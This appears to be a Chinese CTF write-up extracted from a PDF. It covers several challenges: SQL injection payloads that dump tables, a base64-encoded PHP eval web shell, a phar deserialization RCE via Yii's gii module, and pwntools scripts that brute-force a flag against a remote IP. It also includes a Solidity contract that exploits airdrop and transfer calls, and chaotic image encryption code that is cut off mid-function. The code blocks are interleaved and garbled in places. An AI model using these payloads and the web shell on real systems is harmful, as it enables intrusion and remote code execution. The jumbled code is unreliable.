PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOw==
0'/**/union/**/select/**/1,
(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),'1
gtid_executed,sys_config,atable,flag,users
0'/**/union/**/select/**/1,
(select/**/`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/flag/**/limit
/**/1,2)a),'1
0'/**/union/**/select/**/1,
(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users/**/li
mit/**/1,3)a),'1
然后到login.php，根据要求修改UA和Accept头，登录后有flag
codereview
upload⽬录下⾯有⼀个phar.jpg⽂件，检查后发现是本题可以直接利⽤的反序列化链
由于yii使⽤了gii模块，所以⾃带⼀个gii路由
在gii中可以根据模版⽣成代码⽂件，在⽣成Controller时可以添加⼀个viewpath参数，查看代码发现这个viewpath
参数会被传⼊到is_dir中，is_dir可以触发phar的反序列化
把phar.jpg上传到/tmp，在gii⽣成控制器，填写对应字段，viewpath字段设置为 phar:///tmp/phar.jpg
⽣成代码时触发反序列化执⾏，使⽤POST cmd参数RCE
Misc
public function save()
{
    $module = isset(Yii::$app->controller) ? Yii::$app->controller->module : null;
    if ($this->operation === self::OP_CREATE) {
        $dir = dirname($this->path);
        if (!is_dir($dir)) {
            if ($module instanceof \yii\gii\Module) {
                $mask = @umask(0);
                $result = @mkdir($dir, $module->newDirMode, true);
                @umask($mask);
            } else {
                $result = @mkdir($dir, 0777, true);
            }
            if (!$result) {
                return "Unable to create the directory '$dir'.";
            }
        }
    }
    if (@file_put_contents($this->path, $this->content) === false) {
        return "Unable to write the file '{$this->path}'.";
    }
    if ($module instanceof \yii\gii\Module) {
        $mask = @umask(0);
        @chmod($this->path, $module->newFileMode);
        @umask($mask);
    }
    return true;
}
D1fFeReNcE_F@1G
关键:
difflib.SequenceMatcher(None，a，b).ratio()
ratio():
retio()函数计算序列a和b的相似度，ratio = 2.0*M / T，M为匹配的字符数，T为两个序列的总字符数。相似度的计
算可根据实际情况进⾏修改。结果在[0,1]，相同的时候返回1，没有相同⽚段返回0
先⽤单个字符输⼊测试出flag的全部字符:
最后写出解题脚本:⼿⼯试table所有的, 看字符的顺序排名
#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
from pwn import *
import string
io = remote("39.107.68.209",16829)
table = string.printable[:94]
all = ''
for x in table:
    io.recvuntil("Input your guessing flag> ")
    send_data = x
    io.sendline(send_data)
    recvd = io.recvuntil("\n")
    # print(recvd)
    data = eval(recvd)
    if data == 0.9047619047619048:
        all += x
        print("all is : " + all)
# all is : 578adefghjlnpsv{}
#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# 没⾃动化。。⼿⼯试⼀下table所有的，看⼀下字符的顺序排名
from pwn import *
import string
io = remote("39.107.68.209",16829)
table = '578adefghjlnpsv{}'
left = []
right = []
for x in table:
    io.recvuntil("Input your guessing flag> ")
    send_data = "flag{"+"d"+x # 改这个d
    io.sendline(send_data)
    recvd = io.recvuntil("\n")
    # print(recvd)
    data = eval(recvd)
得到flag: flag{5lgpsnd8j7vhe}
Can_you_be_rich
攻击合约:
    if data == 0.5555555555555556:
        left.append(x)
    elif data == 0.4814814814814815:
        right.append(x)
print(left)
print(right)
contract C {
    function set() public {
        address token = 0x5602489a451dc4E0c8DAdc3F85c0268f721F34B7;
        token.call(abi.encodeWithSignature("airdrop(uint256)", 100000000000));
token.call(abi.encodeWithSignature("transfer(address,uint256)",0xb5E8f7e501Ee1384040796
543d420e517ecc21C5,100000000000));
    }
    function exp() public {
        address vulnable = 0x6298325Fbce2A0607860A262d56F6C3475537e48;
        vulnable.call(abi.encodeWithSignature("set(address)", address(this)));
    }
}
完成交互：
Crypto
Chaotic
搜到原⽂：https://blog.csdn.net/qq_41137110/article/details/116191411
改下路径，秘钥，解密即可
import cv2
import hashlib
import numpy as np
import matplotlib.pyplot as plt
'''
加密函数
img:原始图像路径
key:密钥列表，⼤⼩为9(1、2为PWLCM初始条件和参数；3、4、5、6为Chen系统初值，7、8、9为Lorenz系统初值)
return:返回加密后的图像
'''
def encrypt(img,key):
  #读取图⽚
  #opencv的颜⾊通道顺序为[B,G,R]，⽽matplotlib颜⾊通道顺序为[R,G,B],所以需要调换⼀下通道位置
  im=cv2.imread(img)[:,:,(2,1,0)]
  #获取图像宽⾼和通道数
  [w,h,dim]=im.shape
  #⽣成初始条件
  a0=key[0]
  p0=key[1]
  u0=key[2]
  v0=key[3]
  w0=key[4]
  x0=key[5]
  y0=key[6]
  z0=key[7]
  q0=key[8]
  #两次置乱操作
  #图像扁平化为⼀维,flatten in row-major
  pixels = im.flatten(order = 'C')
  #第⼀次置乱
  #PWLCM迭代3*w*h次，得到迭代序列ai
  ai=[]
  for i in range(3*w*h):
    if 0<=a0<p0:
      a0=a0/p0
    elif a0<0.5:
      a0=(a0-p0)*(0.5-p0)
    else:
      a0=1-a0
    ai.append(a0)
  #打包
  dic=list(zip(ai,pixels))
  #根据ai排序
  dic.sort(key=lambda x:x[0])
  #得到排序后的像素列表
  pixels=list(list(zip(*dic))[1])
  #分成R、G、B三个通道
  R=pixels[:w*h]
  G=pixels[w*h:2*w*h]
  B=pixels[2*w*h:]
  #第⼆次置乱
  #Lorenz⽣成三个序列Y,Z,Q
  t=100
  f=10
  r=28
  g=8/3
  #调⽤Lorenz模型函数
  Y,Z,Q=Lorenz(y0,z0,q0,f,r,g,t+w*h)
  #丢弃序列前t个值
  Y=Y[t:]
  Z=Z[t:]
  Q=Q[t:]
  #分别在R、G、B三个通道进⾏排序
  Y_R=list(zip(Y,R))
  #根据序列Y排序
  Y_R.sort(key=lambda x:x[0])
  #得到排序后的像素列表
  R=list(list(zip(*Y_R))[1])
  Z_G=list(zip(Z,G))
  #根据序列Z排序
  Z_G.sort(key=lambda x:x[0])
  #得到排序后的像素列表
  G=list(list(zip(*Z_G))[1])
  Q_B=list(zip(Q,B))
  #根据序列Q排序
  Q_B.sort(key=lambda x:x[0])
  #得到排序后的像素列表
  B=list(list(zip(*Q_B))[1])
  #得到重新排列后的R、G、B颜⾊分量
  #DNA编码
  #Hyper Chaos Chen系统控制参数
  a=36
  b=3
  c=28
  d=16
  k=0.2
  t=100
  U,V,W,X=Chen(u0,v0,w0,x0,a,b,c,d,k,t+3*w*h)
  U=U[t:]
  V=V[t:]
  W=W[t:]
  X=X[t:]
  for i in range(3*w*h):
    rule='ACGT'
    if(int(U[i]%1/0.05) in [0,4,8,10,19]):
      #采⽤编码规则AGCT
      rule='AGCT'
    elif(int(U[i]%1/0.05) in [1,6,12,14,17]):
      #编码规则ACGT
      rule='ACGT'
    elif(int(U[i]%1/0.05) in [2,7,11,13,16]):
      rule='GATC'
    elif(int(U[i]%1/0.05) in [3,5,9,15,18]):
      rule='CATG'
    if(i/(w*h)<1):
      R[i]=DNA_Encode(R[i],rule)
    elif(i/(w*h)<2):
      G[i-w*h]=DNA_Encode(G[i-w*h],rule)
    else:
      B[i-2*w*h]=DNA_Encode(B[i-2*w*h],rule)
  start=[]
  times=[]
  for i in V:
    start.append(int(i*pow(10,12))%8)
  for i in W:
    times.append(int(i*pow(10,12))%8)
  startR=start[:w*h]
  startG=start[w*h:2*w*h]
  startB=start[2*w*h:]
  timesR=times[:w*h]
  timesG=times[w*h:2*w*h]
  timesB=times[2*w*h:]
  #⼋种DNA编码规则
  rules=['ACGT','CATG','GTAC','TCGA','CTAG','AGCT','TGCA','GATC']
  for i in range(w*h):
    #起始规则位置
    s=startR[i]
    for j in range(timesR[i]):
      R[i]=DNA_XOR(R[i],rules[s])
      s=(s+1)%8
  for i in range(w*h):
    #起始规则位置
    s=startG[i]
    for j in range(timesG[i]):
      G[i]=DNA_XOR(G[i],rules[s])
      s=(s+1)%8
  for i in range(w*h):
    #起始规则位置
    s=startB[i]
    for j in range(timesB[i]):
      B[i]=DNA_XOR(B[i],rules[s])
      s=(s+1)%8
  #DNA解码
  for i in range(3*w*h):
    rule='ACGT'
    if(int(X[i]%1/0.05) in [0,4,8,10,19]):
      #采⽤解码规则GTAC
      rule='GTAC'
    elif(int(X[i]%1/0.05) in [1,6,12,14,17]):
      #解码规则TGCA
      rule='TGCA'
    elif(int(X[i]%1/0.05) in [2,7,11,13,16]):
      rule='CTAG'
    elif(int(X[i]%1/0.05) in [3,5,9,15,18]):
      rule='TCGA'
    if(i/(w*h)<1):
      R[i]=DNA_Decode(R[i],rule)
    elif(i/(w*h)<2):
      G[i-w*h]=DNA_Decode(G[i-w*h],rule)
    else:
      B[i-2*w*h]=DNA_Decode(B[i-2*w*h],rule)
  #合并R、G、B三个通道得到加密彩⾊图像
  encrypt_img=np.array((R+G+B)).reshape((512,512,3),order='C')
  return encrypt_img
'''
功能：加密图像解密，加密过程的逆